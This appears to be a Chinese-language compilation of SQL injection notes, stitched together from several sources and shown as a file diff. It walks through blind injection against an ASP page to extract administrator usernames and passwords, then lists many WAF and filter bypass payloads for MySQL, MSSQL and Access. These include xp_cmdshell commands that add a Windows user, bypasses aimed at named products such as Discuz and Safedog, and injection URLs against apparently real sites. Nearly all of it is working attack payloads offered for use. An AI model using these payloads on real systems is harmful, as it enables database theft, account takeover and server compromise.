@@ -1,0 +1,529 @@
+第1步：加单引号。 
+如图6.18所示，在浏览器地址栏中http://www.yyy.com/productDetail_c.asp?ID=568后面加一个单引号，按Enter键后，服务器返回错误提示。 
+
+第2步：测试“and 1=1”。如图6.19所示，在浏览器地址栏中http://www.yyy.com/ productDetail_c.asp?ID=568后面加“and 1=1”，按Enter键后，服务器返回正常页面。
+
+第3步：测试“and 1=2”。 
+如图6.20所示，在浏览器地址栏中http://www.yyy.com/productDetail_c.asp?ID=568后面加“and 1=2”，按Enter键后，服务器返回异常页面。 
+ 
+图6.20  测试“and 1=2” 
+ 
+
+第4步：判断数据库类型。 
+Access和SQL Server都有自己的系统表，比如存放数据库中所有对象的表：Access是在系统表“msysobjects”中，但在Web环境下读该表会提示“没有权限”；SQL Server是在表“sysobjects”中，在Web环境下可正常读取。 
+在确认可以注入的情况下，使用下面的语句： 
+	and (select count(*) from sysobjects)>0 
+
+第5步：猜测表名。猜测表名时也可以使用如下形式： 
+ 	and (select count(*) from admin)>=0 
+	and exists(select * from admin)
+是向数据库查询是否存在admin表，如果存在则返回正常页面，不存在会返回错误提示，如此循环，直至猜测到表名为止。 
+返回正常页面时，猜测到管理员表是admin。
+
+
+第6步：猜测字段名（用户名和密码字段）。表名猜出来后，将count（*）替换成count（字段名），用同样的原理猜解字段名。 
+首先猜测用户名字段： 
+	and (select count(username) from admin)>=0 
+	and exists(select username from admin)
+返回正常页面，用户名字段猜测成功，用户名字段名是“username”。 
+然后猜测密码字段： 
+ 	and (select count(password) from admin)>=0 
+ 	and exists(select password from admin)
+返回正常页面，则密码字段猜测成功，密码字段名是“password”。
+
+and (select top 1 asc (mid(admin,1,1)) from admin)>96
+
+第7步：猜测用户名。已知表admin中存在username字段，下面使用ASCII逐字解码法猜测用户名。 
+猜测用户名的长度： 
+	 and (select top 1 len(username) from admin)>4
+	返回正常页面；	
+	 and (select top 1 len(username) from admin)>5
+	返回不正常页面，可知用户名长度是5。 
+ 
+在得到用户名长度后，用asc (mid (username, N, 1))获得第N位字符的ASCII码，比如： （1）猜测第1个字符。 		        
+
+	 					and (select top 1 asc (mid (username, 1, 1)) from admin)>0
+	
+and (select top 1 asc (mid (username, 1, 1)) from admin)>96显示正常
+
+and (select top 1 asc (mid (username, 1, 1)) from admin)>97显示不正常，说明就是96，ascII中96就是字符a
+
+（2）猜测第二个字符
+and （select top 1 asc（mid（username，2,1））from admin）>0
+and (select top 1 asc (mid (username,2,1)) from admin)>96
+
+
+第⑧步，猜测密码
+	and (select top 1 len(password) from admin)>16
+	得到密码长度为15
+	然后逐字猜测密码
+	and (select top 1 asc(mid(password,1,1)) from admin)>56
+	and (select top 1 asc(mid(password,2,1)) from admin)>67
+依次类推
+
+
+
+
+
+
+0x00 sql注入的原因
+
+sql注入的原因，表面上说是因为 拼接字符串，构成sql语句，没有使用 sql语句预编译，绑定变量。
+
+但是更深层次的原因是，将用户输入的字符串，当成了 “sql语句” 来执行。
+
+比如上面的 String sql = "select id,no from user where id=" + id;
+我们希望用户输入的 id 的值，仅仅作为一个字符串字面值，传入数据库执行，但是当输入了： 2 or 1=1 时，其中的 or 1=1 并没有作为 where id= 的字面值，而是作为了 sql语句 来执行的。所以其本质是将用户的输入的数据，作为了命令来执行。
+0x01 sql注入绕过
+1.1 注释符绕过
+
+常用注释符：
+
+//, -- , /**/, #, --+, -- -, ;,%00,--a
+UNION /**/ Select /**/user，pwd，from user
+U/**/ NION /**/ SE/**/ LECT /**/user，pwd from user
+
+1.2 大小写绕过
+
+?id=1+UnIoN/**/SeLeCT
+
+1.3 内联注释绕过
+
+id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM /*information_schema*/.tables /*!WHERE */+/*!TaBlE_ScHeMa*/+like+database()-- -
+
+通常情况下，上面的代码可以绕过过滤器，请注意，我们用的是 Like而不是 =
+1.4 双关键字绕过
+
+?id=1+UNIunionON+SeLselectECT+1,2,3–
+
+1.5 编码绕过
+
+如URLEncode编码，ASCII,HEX,unicode编码绕过
+
+or 1=1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。
+
+十六进制编码
+
+SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))
+
+双重编码绕过
+
+?id=1%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/1,2,password%252f%252a*/FROM%252f%252a*/Users--+
+
+一些unicode编码举例：  
+单引号：'
+%u0027 %u02b9 %u02bc
+%u02c8 %u2032
+%uff07 %c0%27
+%c0%a7 %e0%80%a7
+空白：
+%u0020 %uff00
+%c0%20 %c0%a0 %e0%80%a0
+左括号(:
+%u0028 %uff08
+%c0%28 %c0%a8
+%e0%80%a8
+右括号):
+%u0029 %uff09
+%c0%29 %c0%a9
+%e0%80%a9
+
+1.6 空格绕过
+
+两个空格代替一个空格，用Tab代替空格
+
+%20 %09 %0a %0b %0c %0d %a0 /**/
+
+括号绕过空格
+在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来
+select(user())from dual where 1=1 and 2=2;
+
+1.7 万能密钥绕过
+
+用经典的or 1=1判断绕过,如or ‘swords’ =’swords
+
+1.8 +,-,.号拆解字符串绕过
+
+?id=1' or '11+11'='11+11'
+"-"和"."
+
+1.9 like绕过
+
+?id=1' or 1 like 1 
+绕过对“=”，“>”等的过滤
+
+2.0 in绕过
+
+or '1' IN ('swords')
+
+2.1 >,<绕过
+
+or 'password' > 'pass'
+or 1<3
+
+2.2 等价函数与命令绕过
+
+1.函数或变量
+
+hex()、bin() ==> ascii()
+
+sleep() ==>benchmark()
+
+concat_ws()==>group_concat()
+
+mid()、substr() ==> substring()
+
+@@user ==> user()
+
+@@datadir ==> datadir()
+
+举例：substring()和substr()无法使用时：?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74　
+
+或者：
+substr((select 'password'),1,1) = 0x70
+strcmp(left('password',1), 0x69) = 1
+strcmp(left('password',1), 0x70) = 0
+strcmp(left('password',1), 0x71) = -1
+
+2.符号
+
+and和or有可能不能使用，可以试下&&和||
+
+=不能使用的情况，可以考虑尝试<、>
+
+3.生僻函数
+
+MySQL/PostgreSQL支持XML函数：Select UpdateXML(‘<script x=_></script> ’,’/script/@x/’,’src=//evil.com’);　　　　　　　　　　
+
+?id=1 and 1=(updatexml(1,concat(0x3a,(select user())),1))
+
+SELECT xmlelement(name img,xmlattributes(1as src,'a\l\x65rt(1)'as \117n\x65rror));　//postgresql
+
+?id=1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));
+
+and 1=(updatexml(1,concat(0x5c,(select user()),0x5c),1))
+
+and extractvalue(1, concat(0x5c, (select user()),0x5c))
+
+2.3 反引号`绕过
+
+select `version()`，可以用来过空格和正则，特殊情况下还可以将其做注释符用
+
+2.4 换行符绕过
+
+%0a、%0d
+
+2.5 截断绕过
+
+%00,%0A,?,/0,////////////////........////////,%80-%99
+
+目录字符串，在window下256字节、linux下4096字节时会达到最大值，最大值长度之后的字符将被丢弃。
+././././././././././././././././abc
+////////////////////////abc
+..1/abc/../1/abc/../1/abc
+
+2.6 宽字节绕过
+
+过滤单引号时，可以试试宽字节
+
+%bf%27 %df%27 %aa%27
+
+2.7 \N绕过
+
+\N其实相当于NULL字符
+
+select * from users where id=8E0union select 1,2,3,4,5,6,7,8,9,0
+select * from users where id=8.0union select 1,2,3,4,5,6,7,8,9,0
+select * from users where id=\Nunion select 1,2,3,4,5,6,7,8,9,0
+
+2.8 特殊的绕过函数
+
+1. 通过greatest函数绕过不能使用大小于符号的情况
+
+greatest(a,b)，返回a和b中较大的那个数。
+当我们要猜解user()第一个字符的ascii码是否小于等于150时，可使用：
+mysql> select greatest(ascii(mid(user(),1,1)),150)=150;
+ +------------------------------------------+
+| greatest(ascii(mid(user(),1,1)),150)=150 |
+ +------------------------------------------+
+|                                        1 |
+ +------------------------------------------+
+如果小于150，则上述返回值为True。
+
+2. 通过substr函数绕过不能使用逗号的情况
+
+mid(user() from 1 for 1)
+或
+substr(user() from 1 for 1)
+
+mysql> select ascii(substr(user() from 1 for 1)) < 150;
+ +------------------------------------------+
+| ascii(substr(user() from 1 for 1)) < 150 |
+ +------------------------------------------+
+|                                        1 |
+ +------------------------------------------+
+
+3.使用数学运算函数在子查询中报错
+
+exp(x)函数的作用： 取常数e的x次方，其中，e是自然对数的底。
+
+~x 是一个一元运算符，将x按位取补
+
+select exp(~(select*from(select user())a))
+mysql报错：
+mysql> select exp(~(select*from(select user())a));
+ERROR 1690 (22003): DOUBLE value is out of range in ‘exp(~((select ‘root@localhost’ from dual)))’
+
+这条查询会出错，是因为exp(x)的参数x过大，超过了数值范围，分解到子查询，就是：
+
+(select*from(select user())a) 得到字符串 root@localhost
+
+表达式’root@localhost’被转换为0，按位取补之后得到一个非常的大数，它是MySQL中最大的无符号整数
+
+附：PHP中一些常见的过滤方法及绕过方式
+
+过滤关键字   and or
+php代码   preg_match('/(and|or)/i',$id)
+会过滤的攻击代码    1 or 1=1 1 and 1=1
+绕过方式    1 || 1=1 1 && 1=1
+
+过滤关键字   and or union
+php代码   preg_match('/(and|or|union)/i',$id)
+会过滤的攻击代码    union select user,password from users
+绕过方式    1 && (select user from users where userid=1)='admin'
+
+过滤关键字   and or union where
+php代码   preg_match('/(and|or|union|where)/i',$id)
+会过滤的攻击代码    1 && (select user from users where user_id = 1) = 'admin'
+绕过方式    1 && (select user from users limit 1) = 'admin'
+
+过滤关键字   and or union where
+php代码   preg_match('/(and|or|union|where)/i',$id)
+会过滤的攻击代码    1 && (select user from users where user_id = 1) = 'admin'
+绕过方式    1 && (select user from users limit 1) = 'admin'
+
+过滤关键字   and, or, union, where, limit
+php代码   preg_match('/(and|or|union|where|limit)/i', $id)
+会过滤的攻击代码    1 && (select user from users limit 1) = 'admin'
+绕过方式    1 && (select user from users group by user_id having user_id = 1) = 'admin'#user_id聚合中user_id为1的user为admin
+
+过滤关键字   and, or, union, where, limit, group by
+php代码   preg_match('/(and|or|union|where|limit|group by)/i', $id)
+会过滤的攻击代码    1 && (select user from users group by user_id having user_id = 1) = 'admin'
+绕过方式    1 && (select substr(group_concat(user_id),1,1) user from users ) = 1
+
+过滤关键字   and, or, union, where, limit, group by, select
+php代码   preg_match('/(and|or|union|where|limit|group by|select)/i', $id)
+会过滤的攻击代码    1 && (select substr(gruop_concat(user_id),1,1) user from users) = 1
+绕过方式    1 && substr(user,1,1) = 'a'
+
+过滤关键字   and, or, union, where, limit, group by, select, '
+php代码   preg_match('/(and|or|union|where|limit|group by|select|\')/i', $id)
+会过滤的攻击代码    1 && (select substr(gruop_concat(user_id),1,1) user from users) = 1
+绕过方式    1 && user_id is not null 1 && substr(user,1,1) = 0x61 1 && substr(user,1,1) = unhex(61)
+
+过滤关键字   and, or, union, where, limit, group by, select, ', hex
+php代码   preg_match('/(and|or|union|where|limit|group by|select|\'|hex)/i', $id)
+会过滤的攻击代码    1 && substr(user,1,1) = unhex(61)
+绕过方式    1 && substr(user,1,1) = lower(conv(11,10,16)) #十进制的11转化为十六进制，并小写。
+
+过滤关键字   and, or, union, where, limit, group by, select, ', hex, substr
+php代码   preg_match('/(and|or|union|where|limit|group by|select|\'|hex|substr)/i', $id)
+会过滤的攻击代码    1 && substr(user,1,1) = lower(conv(11,10,16))/td>
+绕过方式    1 && lpad(user,7,1)
+
+过滤关键字   and, or, union, where, limit, group by, select, ', hex, substr, 空格
+php代码   preg_match('/(and|or|union|where|limit|group by|select|\'|hex|substr|\s)/i', $id)
+会过滤的攻击代码    1 && lpad(user,7,1)/td>
+绕过方式    1%0b||%0blpad(user,7,1)
+
+过滤关键字   and or union where
+php代码   preg_match('/(and|or|union|where)/i',$id)
+会过滤的攻击代码    1 || (select user from users where user_id = 1) = 'admin'
+绕过方式    1 || (select user from users limit 1) = 'admin'
+
+
+一、各种编码绕过
+
+1、URL编码
+?id=1 union select pass from admin limit 1
+?id=1%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%70%61%73%73%20%66%72%6f%6d%20%61%64%6d%69%6e%20%6c%69%6d%69%74%20%31
+2、Unicode编码
+'e' => '%u0065', //这是他的Unicode 编码
+?id=1 union select pass from admin limit 1
+?id=1 un%u0069on sel%u0065ct pass f%u0072om admin li%u006dit 1
+3、针对disucz x内置_do_query_safe()的绕过
+gid=1 and 1=2 union select 1,2,3,4,5,6,concat(user,0x23,password),8,9,10,11,12,13 from mysql.user 拦截
+gid=1 and 1=2 union /*!50000select*/ 1,2,3,4,5,6,concat(user,0x23,password),8,9,10,11,12,13 from mysql.user 绕过disucz x2.0
+gid=@`'` union select @`'`,2,3,4,5,6,7,concat(user,0x3a,password),9,10,11,12,13,14 from mysql.user 绕过disucz x2.5
+gid=`'` or @`''` union select 1 from (select count(*),concat((select database()),floor(rand(0)*2))a from information_schema.tables group by a)b where @`'` 绕过
+disucz x2.5 二次修补
+这里我引入了`'`用来隐藏第一个@字符，并将第一个@`'`替换为@`''`，这样便可以替换掉第二个@
+4、绕过某waf –by havij
+/*!30000union all select (select distinct concat(0x7e,0x27,unhex(Hex(cast(schema_name as char))),0x27,0x7e) from `information_schema`.schemata limit 10,1),null,null,null,null*/--
+list.php?yw=bj&id=3&id=1 /*!30000union all select (select concat(0x27,uid,0x5e,username,0x5e,password,0x5e,email,0x5e,salt,0x27) from `gs_ucenter`.uc_members limit 0,1) ,null,null,null,null*/--
+5、某次笔记
+newsid=60+a%nd%201=(se%lect%20@@VERSION)--
+newsid=60+a%nd%201=(se%lect%20@@servername)--
+newsid=60+a%nd 1=(se%lect name f%rom mas%ter.dbo.sysd%atabases wh%ere dbid=1)--
+newsid=60+a%nd (se%lect t%o%p 1 name f%rom pedaohang.d%b%o.s%ys%obje%cts where xtype='U' a%nd name not in (se%lect top 1 name fr%om gpbctv.dbo.sysobjects wh%ere xtype='U'))>0--
+newsid=60+a%nd (se%lect t%o%p 1 col_name(object_id('Art_Admin'),1) f%rom sysobjects)>0--
+newsid=60+a%nd (se%lect t%o%p 1 pass fr%om Art_Admin where pass not in (se%lect t%o%p 1 pass fr%om Art_Admin))>0--
+IIS下的asp.dll文件在对asp文件后参数串进行url解码时，会直接过滤掉09-0d（09是tab键,0d是回车)、20（空格)、%(下两个字符有一个不是十六进制)字符。因此在网络层的防护，只要内置规则大于两个字符，就会被绕过。如内置规则为..可以使用.%.来绕过.
+6、绕过智创网站专业级防火墙
+http://www.waitalone.cn/shownews.asp?id=%28-575%29UNION%20%28SELECT%201,username,3,4,passwd,6,7,8,9,10,11,12,13,14,15,16,17,18%20from%28admin%29%29 拦截
+http://www.waitalone.cn/shownews.asp?id=%28-575%29UNION%20%28SELECT%201,username,3,4,passwd,6,7,8,9,10,11,12,13,14,15,16,17,18%20from%28admin%29%29 绕过
+这里主要SEL%E%CT来代替select,简单来说一下这个网络层waf对SEL%E%CT进行url解码后变成SEL%E%CT 匹配select失败，而进入asp.dll对SEL%E%CT进行url解码却变成select。IIS下的asp.dll文件在对asp文件后参数串进行url解码时，会直接过滤掉09-0d（09是tab键,0d是回车)、20（空格)、%(下两个字符有一个不是十六进制)字符。
+小提示：早期的智创可以通过cookie来绕过。通过查看产品说明，发现它只过滤了GET和POST数据（也就是QueryString，PostData)。
+7、早期安全狗的绕过
+1)NULL字节截断突破
+安全狗本身对xx.asp?id=69 and 1=1和 xx.asp?id=69 and 1=2这些是过滤的，可是对xx.asp?0day5.com=%00.&xw_id=69%20 and 1=1和xx.asp?0day5.com=%00.&xw_id=69%20 and 1=2 却是正常，直接丢到工具就OK了。
+//%00相当于NULL, null字符截断吧，WAF在parse url参数的时候被截断了
+2)对编码绕过
+使用u%n%i%o%n+s%e%l%e%cT 很少成功，虽然绕过了
+3) 利用复参 —参加成信比赛遇到的
+http://hack.myclover.org/pentration/4/yinmou.php?id=4
+http://hack.myclover.org/pentration/4/yinmou.php?id=1&id=1/**/And/**/1=2/**/Union/**/Select/**/1,concat%28database%28%29,0x3a,user%28%29,0x3a,version%28%29%29,3
+或者写了个注入中转点，然后开了sqlmap的randomcase和space2comment插件跑的
+4) 最新过狗，最近一直没压力的
+把空格使用/**/来替换
+and使用a%n%d来替换
+from打乱，就是类似f%u0072om
+4)agent代理
+使用百度或者是谷歌的agent代理
+google蜘蛛：Googlebot 百度蜘蛛：Baiduspider
+8、数据库一些绕过bypass
+mysql:内联注释: select -> /*!select*/这样写法.
+select?user,password?from?user?xxx?union?select(1),(2);
+Mysql中空格也可以用+或/**/号代替.
+(切记Mysql select->sele/**/ct 不能这样写法,很多文章说能这样写是错误的! MSSQL松散性问题可以这样写,下面有介绍.)
+9、GET参数SQL注入%0A换行污染绕过
+绕过描述：
+在GET请求时，将URL的SQL注入关键字用%0A分隔，%0A是换行符，在mysql中可以正常执行。
+测试方法：
+请求测试url：http://www.webshell.cc/1.php?id=1%20union%20select%201,2,3,4 被拦截
+请求测试url：http://www.webshell.cc/1.php?id=-9%0Aunion%0Aselect 1,2,3,4 绕过
+MSSQL:
+用HEX绕过，一般的IDS都无法检测出来:
+0x730079007300610064006D0069006E00 =hex(sysadmin)
+0x640062005F006F0077006E0065007200 =hex(db_owner)
+例如先声明一个变量a，然后把我们的指令赋值给a，然后调用变量a最终执行我们输入的命令。变量a可以是任何命令。如下：
+declare @a sysnameselect @a=exec master.dbo.xp_cmdshell @a
+http://www.xxx.com/xxx.asp?id=1;declare%20@a%20sysname%20select @a=0x6e006500740020007500730065007200200061006e00670065006c002000700061007300730020002f00610064006400 exec master.dbo.xp_cmdshell @a;--
+0x6e006500740020007500730065007200200061006e00670065006c002000700061007300730020002f00610064006400 就是"net user angel pass /add"的意思。
+这里是sql编码
+在前面通过空格绕过也介绍了mssql是松散性,大家可以回头看看.
+运用注释语句绕过
+用/**/代替空格，如：UNION /**/ Select /**/user,pwd,from tbluser
+用/**/分割敏感词，如：U/**/NION/**/SE/**/LECT/**/user,pwd from tbluser
+Access:
+用(),[]其中,"[]"用于表和列,"()"用于数值也可以做分隔.
+http://www.waitalone.cn/shownews.asp?id=%28-575%29UNION%20SE%LECT%201,username,3,4,passwd,6,7,8,9,10,11,12,13,14,15,16,17,18%20from[admin]
+admin用[]起来 哈哈,前面的SE%LECT 前面编码介绍过了.
+http://www.waitalone.cn/shownews.asp?id=%28-575%29UNION%20SE%LECT%201,[username],3,4,[passwd],6,7,8,9,10,11,12,13,14,15,16,17,18%20from[admin]
+username passwd也来[]哈哈.
+之前提到的:
+http://www.waitalone.cn/shownews.asp?id=%28-575%29UNION%20%28SE%LECT%201,username,3,4,passwd,6,7,8,9,10,11,12,13,14,15,16,17,18%20from%20%28admin%29%29
+admin表用() (SELECT ……..) 双重括号.
+() 和[]组合例子举这么多了,大家可以多多测试灵活利用.
+http://www.waitalone.cn/shownews.asp?id=575and%201=2
+http://www.waitalone.cn/shownews.asp?id=575and%201=1
+哈哈,大家找到亮点没? 没错Access也有空格松散性~~~~
+575and 1=2
+575and 1=1
+二、复参数绕过
+
+?id=1 union select 1&id=pass from admin
+上文提到了:
+http://www.waitalone.cn/shownews.asp?id=%28-575%29UNION%20%28SELECT%201,username,3,4,passwd,6,7,8,9,10,11,12,13,14,15,16,17,18%20from%28admin%29%29
+此链接会被拦截..
+用此下链接:
+http://www.waitalone.cn/shownews.asp?id=%28-575%29UNION%20%28SELECT%201,username,3,4,passwd,6,7,8,9,10,11,12,13,14,15,16,17&id=18%20from%28admin%29%29
+两个链接对比:
+第二个链接比第一个链接多了:&id=
+第二个链接比第一个链接少了:,
+我用参数覆盖的形式绕过了WAF, asp的参数复用&id=xx -> 变为, xx 这是个asp一个BUG,也是个绕过的技巧.
+Php也可以变量覆盖绕过类型,不同于asp:
+http://xxx.com/test.php?id=0写成:
+http://xxx.com/test.php?id=0&id=7 and 1=2 //&id=0 ->变为&id=7 and 1=2 并没有像asp那样有,的出现!
+id参数重复变量的绕过，重复变量的变体。
+此方法依实际情况而定，部分WAF允许变量覆盖，也就是相同的变量赋了不同的值，覆盖了waf的cache。但是后端程序会优先处理最先前的值。
+三、异常Method绕过
+
+Seay /1.php?id=1 and 1=1 HTTP/1.1
+Host: www.cnseay.com
+Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+4.异常Method绕过
+5.编码方式绕过(urlencoded/from-data)
+6.超大数据包绕过
+7.数据包分块传输绕过
+一、数据库特殊语法绕过
+
+1.mysql .符号和~符号和!符号以及+和-号连接?id=1.union%0aselect@1,2 ,!3,4
+二、关键字拆分绕过
+
+cnseay.com/1.aspx?id=1;EXEC('ma'+'ster..x'+'p_cm'+'dsh'+'ell "net user"')
+三、请求方式差异规则松懈性绕过
+
+GET /id=1 union select 1,2,3,4 —拦截
+POST id=1 union select 1,2,3,4 —绕过
+waf业务限制，POST规则相对松懈
+四、冷门函数/标签绕过
+
+1. /1.php?id=1 and 1=(updatexml(1,concat(0x3a,(select user())),1))
+2. /1.php?id=1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));
+五、WAF规则策略阶段的绕过总结
+
+1.字母大小写转换
+2.数据库特殊语法绕过
+3.关键字拆分绕过
+4.请求方式差异规则松懈性绕过
+5.多URL伪静态绕过
+6.白字符绕过
+7.冷门函数/标签绕过
+
+转载请注明来自Cracer，本文标题：《绕过waf的一些方法总结》
+
+
+
+
+
+select * from user where username=0#为什么这里返回正确的值呢，类似于php的弱类型，字符串和数字进行比较，先比较第一个，数字是0,username的字符串，如果第一个不是数字，例如admin,admin的a被视为0,因而返回成功
+
+算数运算拼接，'+'     '-'     '*'     '/#   '%1#
+
+位操作运算   '&0#    '|0#     '^0#  '<<0#'>>0#
+
+安全等于   '=0<=>1# 拼接的语句：where username=''=0<=>1#'
+
+
+不等于<>(!=)
+1
+	
+ '=0<>0# 拼接的语句：where username=''=0<>0#'
+
+
+大小于>或<
+1
+	
+ '>-1# 拼接的语句：where username=''>-1#
+认证绕过
+
+
+
+绕过语句：'='
+
+	
+select data from users where name="="
+select data from users where flase="
+select data from users where 0=0
+
+绕过语句：'-'
+select data from users where name=''-''
+select data from users where name=0-0
+select data from users where 0=0
+使用换行符代替空格。注意服务器若为Windows则换行符为%0A%0D，Linux则为%0A。
+文件的63行开始可以看到，此处将传入的%27和%2527都进行删除处理，也就是还没传入数据库前就已经被该死的程序吃了，但是在67行看到他还吃了*，这样我们就有办法了，我们构造%*27，这样程序吃掉星号*后，%27就会被传入。
+
